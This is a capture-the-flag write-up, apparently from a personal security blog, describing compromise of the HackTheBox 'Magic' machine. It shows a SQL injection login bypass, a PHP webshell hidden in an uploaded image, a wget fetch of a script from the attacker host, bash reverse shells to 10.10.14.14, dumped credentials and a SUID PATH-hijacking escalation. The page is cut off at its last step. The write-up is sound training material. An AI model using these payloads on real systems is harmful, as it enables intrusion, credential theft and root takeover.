<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="HackTheBox - Magic" /><meta property="og:locale" content="en" /><meta name="description" content="Overview This machine begins w/ a web enumeration, discovering login.php, a login page that is susceptible to a SQLi Authentication bypass due to the lack of input sanitization. Next, we are redirected to upload.php where only images and be uploaded, however it is susceptible to an file upload bypass, allowing us to insert webshell to execute code, allowing us to obtain a low-privilege/www-data shell." /><meta property="og:description" content="Overview This machine begins w/ a web enumeration, discovering login.php, a login page that is susceptible to a SQLi Authentication bypass due to the lack of input sanitization. Next, we are redirected to upload.php where only images and be uploaded, however it is susceptible to an file upload bypass, allowing us to insert webshell to execute code, allowing us to obtain a low-privilege/www-data shell." /><link rel="canonical" href="https://yufongg.github.io/posts/Magic/" /><meta property="og:url" content="https://yufongg.github.io/posts/Magic/" /><meta property="og:site_name" content="Yufong" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-27T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Magic" /><meta name="twitter:site" content="@yufongg" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-09T02:05:28+08:00","datePublished":"2022-09-27T00:00:00+08:00","description":"Overview This machine begins w/ a web enumeration, discovering login.php, a login page that is susceptible to a SQLi Authentication bypass due to the lack of input sanitization. Next, we are redirected to upload.php where only images and be uploaded, however it is susceptible to an file upload bypass, allowing us to insert webshell to execute code, allowing us to obtain a low-privilege/www-data shell.","headline":"HackTheBox - Magic","mainEntityOfPage":{"@type":"WebPage","@id":"https://yufongg.github.io/posts/Magic/"},"url":"https://yufongg.github.io/posts/Magic/"}</script><title>HackTheBox - Magic | Yufong</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Yufong"><meta name="application-name" content="Yufong"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/Bob 1.0.1/images/koko.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Yufong</a></div><div class="site-subtitle font-italic">OSCP | Infosec Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/yufongg" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/watch?v=7hjHZOc-e4w" aria-label="youtube" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="http://discordapp.com/users/175250797578158080" aria-label="discord" target="_blank" rel="noopener"> <i class="fab fa-discord"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/834331" aria-label="hackthebox" target="_blank" rel="noopener"> <i class="fa fa-cube"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HackTheBox - Magic</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Magic/images/Pasted%20image%2020220926050224.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>HackTheBox - Magic</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/yufongg">yufongg</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1664208000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-09-27 </em> </span> <span> Updated <em class="timeago" data-ts="1749405928" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-06-09 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2065 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><p>This machine begins w/ a web enumeration, discovering <code class="language-plaintext highlighter-rouge">login.php</code>, a login page that is susceptible to a SQLi Authentication bypass due to the lack of input sanitization. Next, we are redirected to <code class="language-plaintext highlighter-rouge">upload.php</code> where only images and be uploaded, however it is susceptible to an file upload bypass, allowing us to insert webshell to execute code, allowing us to obtain a low-privilege/<code class="language-plaintext highlighter-rouge">www-data</code> shell.</p><p>For the privilege escalation part, we have to privilege escalate to <code class="language-plaintext highlighter-rouge">theseus</code> and then to <code class="language-plaintext highlighter-rouge">root</code>. Since there was a login page earlier, we found database credentials on a database configuration file <code class="language-plaintext highlighter-rouge">db5.php</code>. However, we do not have <code class="language-plaintext highlighter-rouge">mysql</code> on <code class="language-plaintext highlighter-rouge">magic.htb</code>, to overcome this, we use a <code class="language-plaintext highlighter-rouge">PHP</code> file to query the database, obtaining the password for user <code class="language-plaintext highlighter-rouge">theseus</code>.</p><p>After further enumerating the system for files with setuid bit, a binary <code class="language-plaintext highlighter-rouge">sysinfo</code> is discovered and is susceptible to a PATH hijacking exploit, due to not calling executables w/ their full PATH. We unset our PATH environment and added <code class="language-plaintext highlighter-rouge">/tmp</code>, next, we created a malicious reverse shell bashscript called <code class="language-plaintext highlighter-rouge">fdisk</code>, so when <code class="language-plaintext highlighter-rouge">fdisk</code> is executed during <code class="language-plaintext highlighter-rouge">sysinfo</code>, the reverse shell is invoked, allowing us to privilege escalate to <code class="language-plaintext highlighter-rouge">root</code>.</p><hr /><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Box Name<td>Magic<tr><td>IP<td>10.10.10.185<tr><td>Points<td>30<tr><td>Difficulty<td>Medium<tr><td>Creator<td><a href="https://www.hackthebox.com/home/users/profile/31190">TRX</a><tr><td>Release Date<td>18 Apr 2020</table></div><h1 id="recon">Recon</h1><h2 id="tcp80-http">TCP/80 (HTTP) <a href="#tcp80-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li>FFUF<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>  200      GET       60l      207w     4053c http://10.10.10.185/index.php
  302      GET        0l        0w        0c http://10.10.10.185/logout.php =&gt; index.php
  403      GET        9l       28w      277c http://10.10.10.185/server-status
  200      GET      108l      217w     2136c http://10.10.10.185/assets/css/upload.css
  200      GET       27l       59w      782c http://10.10.10.185/assets/js/upload.js
  302      GET       84l      177w     2957c http://10.10.10.185/upload.php =&gt; login.php
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">upload.php</code></ul></ul><h1 id="initial-foothold">Initial Foothold</h1><h2 id="tcp80-http---sqli-authentication-bypass">TCP/80 (HTTP) - SQLi Authentication Bypass <a href="#tcp80-http---sqli-authentication-bypass" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Login page @ <code class="language-plaintext highlighter-rouge">http://magic.htb/login.php</code> is susceptible to SQLi Authentication Bypass<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> # Payload
 ' OR 1=1 -- -
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Magic/images/Pasted%20image%2020220926174355.png" alt="" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Redirected to an image upload page - <code class="language-plaintext highlighter-rouge">upload.php</code></p></div></blockquote></ol><h2 id="tcp80-http---file-upload-bypass">TCP/80 (HTTP) - File Upload Bypass <a href="#tcp80-http---file-upload-bypass" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>After some testing, the upload page has some sort of filter to prevent malicious files from being uploaded<ul><li><code class="language-plaintext highlighter-rouge">.php</code> - unable to upload<li><code class="language-plaintext highlighter-rouge">.jpg, .png</code> - uploaded<li>Uploaded files go to <code class="language-plaintext highlighter-rouge">upload/images/&lt;filename&gt;</code></ul><li>However, the restrictions can be bypassed<ol><li>Upload any image file<li>Add a webshell payload into the middle <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Magic/images/Pasted%20image%2020220926223237.png" alt="" data-proofer-ignore><li>Test our webshell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/magic/10.10.10.185/exploit]
 └─# curl -s "http://10.10.10.185/images/uploads/bingchilling.php.jpg?c=id" --output - | strings | grep www-data
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre></table></code></div></div><li>Create reverse shell payload<div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> <span class="c">#!/bin/bash</span>
		
 /bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.14/4444 0&gt;&amp;1
</pre></table></code></div></div><li>Download reverse shell payload into <code class="language-plaintext highlighter-rouge">magic.htb</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> # Payload
 http://10.10.10.185/images/uploads/bingchilling.php.jpg?c=wget+10.10.14.14/exploit.sh+-O+/tmp/exploit.sh
</pre></table></code></div></div><li>Start <code class="language-plaintext highlighter-rouge">netcat</code> listener<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/magic]
 └─# nc -nvlp 4444
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
 Ncat: Connection from 10.10.10.185.
</pre></table></code></div></div><li>Invoke reverse shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> http://10.10.10.185/images/uploads/bingchilling.php.jpg?c=chmod+777+/tmp/exploit.sh;/tmp/exploit.sh
</pre></table></code></div></div></ol><li>Demo - Image upload bypass and insert webshell <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Magic/images/oBIpFJB0O5.gif" alt="" data-proofer-ignore></ol><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="theseus---enumeration">Theseus - Enumeration <a href="#theseus---enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Since there is a login page (<code class="language-plaintext highlighter-rouge">login.php</code>), there should be database credentials<blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">db5.php</code> is included</p></div></blockquote><li>Found database creds in <code class="language-plaintext highlighter-rouge">db5.php</code><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> <span class="k">private</span> <span class="k">static</span> <span class="nv">$dbName</span> <span class="o">=</span> <span class="s1">'Magic'</span> <span class="p">;</span>
 <span class="k">private</span> <span class="k">static</span> <span class="nv">$dbHost</span> <span class="o">=</span> <span class="s1">'localhost'</span> <span class="p">;</span>
 <span class="k">private</span> <span class="k">static</span> <span class="nv">$dbUsername</span> <span class="o">=</span> <span class="s1">'theseus'</span><span class="p">;</span>
 <span class="k">private</span> <span class="k">static</span> <span class="nv">$dbUserPassword</span> <span class="o">=</span> <span class="s1">'iamkingtheseus'</span><span class="p">;</span>
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">theseus:iamkingtheseus</code></ul><li>Failed to switch to user <code class="language-plaintext highlighter-rouge">theseus</code> w/ <code class="language-plaintext highlighter-rouge">iamkingtheseus</code><li>Access <code class="language-plaintext highlighter-rouge">mysql</code> to obtain more credentials<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre> theseus@ubuntu:/var/www/Magic$ mysql
	
 Command 'mysql' not found, but can be installed with:
	
 apt install mysql-client-core-5.7
 apt install mariadb-client-core-10.1
	
 Ask your administrator to install one of them.
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">mysql-client</code> does not exist</ul><li>We can confirm that <code class="language-plaintext highlighter-rouge">mysql</code> is running w/ <code class="language-plaintext highlighter-rouge">netstat</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> www-data@ubuntu:/var/www/Magic$ netstat -ano | grep 3306
 tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
</pre></table></code></div></div></ol><h2 id="theseus---obtain-creds-by-querying-mysql-w-php">Theseus - Obtain creds by querying mysql w/ PHP <a href="#theseus---obtain-creds-by-querying-mysql-w-php" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Create a <code class="language-plaintext highlighter-rouge">PHP</code> file <code class="language-plaintext highlighter-rouge">query.php</code> to <code class="language-plaintext highlighter-rouge">query</code> the database<div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre> <span class="cp">&lt;?php</span>
 <span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
 <span class="nv">$username</span> <span class="o">=</span> <span class="s2">"theseus"</span><span class="p">;</span>
 <span class="nv">$password</span> <span class="o">=</span> <span class="s2">"iamkingtheseus"</span><span class="p">;</span>
 <span class="nv">$dbname</span> <span class="o">=</span> <span class="s2">"Magic"</span><span class="p">;</span>
	
 <span class="c1">// Create connection</span>
 <span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="nv">$servername</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">);</span>
 <span class="c1">// Check connection</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="n">connect_error</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">die</span><span class="p">(</span><span class="s2">"Connection failed: "</span> <span class="mf">.</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="n">connect_error</span><span class="p">);</span>
 <span class="p">}</span>
	
 <span class="c1">#$sql = "SELECT id, firstname, lastname FROM MyGuests";</span>
 <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT username, password FROM login"</span><span class="p">;</span>
 <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
	
 <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
   <span class="c1">// output data of each row</span>
   <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
     <span class="k">echo</span> <span class="s2">"username: "</span> <span class="mf">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span><span class="mf">.</span> <span class="s2">" - password: "</span> <span class="mf">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">"password"</span><span class="p">];</span>
   <span class="p">}</span>
 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
   <span class="k">echo</span> <span class="s2">"0 results"</span><span class="p">;</span>
 <span class="p">}</span>
 <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">close</span><span class="p">();</span>
 <span class="cp">?&gt;</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Queries for username &amp; password from <code class="language-plaintext highlighter-rouge">Magic</code> database from <code class="language-plaintext highlighter-rouge">login</code> table - <a href="https://www.w3schools.com/php/php_mysql_select.asp">Code Skeleton</a></p></div></blockquote><li>Query <code class="language-plaintext highlighter-rouge">mysql</code> database<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> www-data@ubuntu:/var/www/Magic$ php query.php
 username: admin - password: Th3s3usW4sK1ng
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">admin:Th3s3usW4sK1ng</code></ul><li>Switch to user <code class="language-plaintext highlighter-rouge">theseus</code> w/ <code class="language-plaintext highlighter-rouge">Th3s3usW4sK1ng</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> www-data@ubuntu:/var/www/Magic$ su theseus
 Password: Th3s3usW4sK1ng
 theseus@ubuntu:/var/www/Magic$ id;whoami
 uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
 theseus
</pre></table></code></div></div><li>Demo - Query database w/ PHP <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Magic/images/TYztc97uYa.gif" alt="" data-proofer-ignore></ol><h2 id="root---enumeration">Root - Enumeration <a href="#root---enumeration" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Enumerate files w/ setuid bit<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> theseus@ubuntu:/var/www/Magic$ find / -perm /4000 -type f -exec ls -lda {} \; 2&gt;/dev/null | grep info
 -rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Magic/images/Pasted%20image%2020220927060927.png" alt="" data-proofer-ignore></p></ol><h2 id="root---what-is-systeminfo-doing">Root - What is systeminfo doing? <a href="#root---what-is-systeminfo-doing" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Find out what file type is <code class="language-plaintext highlighter-rouge">/bin/sysinfo</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre> theseus@ubuntu:/var/www/Magic$ file /bin/sysinfo
 /bin/sysinfo: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=9e9d26d004da0634c0747d16d377cd2a934e565a, not stripped
</pre></table></code></div></div><li>Analyze the binary w/ <code class="language-plaintext highlighter-rouge">binaryninja</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/HackTheBox/Linux/Magic/images/Pasted%20image%2020220927061405.png" alt="" data-proofer-ignore><blockquote class="prompt-info"><div><p><code class="language-plaintext highlighter-rouge">sysinfo</code> is susceptible to PATH Hijacking exploit because the executables/binaries are not called w/ their FULL PATH.</p></div></blockquote></ol><h2 id="root---path-hijacking">Root - Path Hijacking <a href="#root---path-hijacking" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Understanding PATH environment variable<ul><li><code class="language-plaintext highlighter-rouge">PATH</code> specifies the directories in which executable programs are located on the machine that can be started without knowing and typing the whole path to the file on the command line. - <a href="https://superuser.com/questions/284342/what-are-path-and-other-environment-variables-and-how-can-i-set-or-use-them">Source</a></ul><li>How do we exploit <code class="language-plaintext highlighter-rouge">/bin/sysinfo</code><ol><li>Since the executables are not called w/ their full path, the system will search all the directories defined in the PATH environment variable for the executables.<li>We can prepend a directory we have write access to, to the path environment variable, so that the system searches that directory first.<li>We create a malicious executable that has the same name as the executable called in <code class="language-plaintext highlighter-rouge">sysinfo</code>, this will cause the system to execute our malicious executable because it is found first in the PATH environment.</ol><li>However, the exploit does not work if we prepend <code class="language-plaintext highlighter-rouge">/tmp</code>, we have to unset the PATH environment and then add <code class="language-plaintext highlighter-rouge">/tmp</code> only, not sure why.<li>Exploit <code class="language-plaintext highlighter-rouge">/bin/sysinfo</code><ol><li>Create reverse shell payload<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre> theseus@ubuntu:/tmp$ cat fdisk
 #!/bin/bash
		
 /bin/bash -i &gt;&amp; /dev/tcp/10.10.14.14/4444 0&gt;&amp;1
</pre></table></code></div></div><li>Unset PATH environment variable<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre> theseus@ubuntu:/tmp$ echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
		
 theseus@ubuntu:/tmp$ unset PATH
 theseus@ubuntu:/tmp$ echo $PATH
		
 theseus@ubuntu:/tmp$
</pre></table></code></div></div><li>Add <code class="language-plaintext highlighter-rouge">/tmp</code> to our PATH environment variable<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> theseus@ubuntu:/tmp$ export PATH=/tmp
 theseus@ubuntu:/tmp$ echo $PATH
 /tmp
</pre></table></code></div></div><li>Start <code class="language-plaintext highlighter-rouge">netcat</code> listener<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/htb/magic]
 └─# nc -nvlp 4444
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::4444
 Ncat: Listening on 0.0.0.0:4444
</pre></table></code></div></div><li>Invoke reverse shell<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
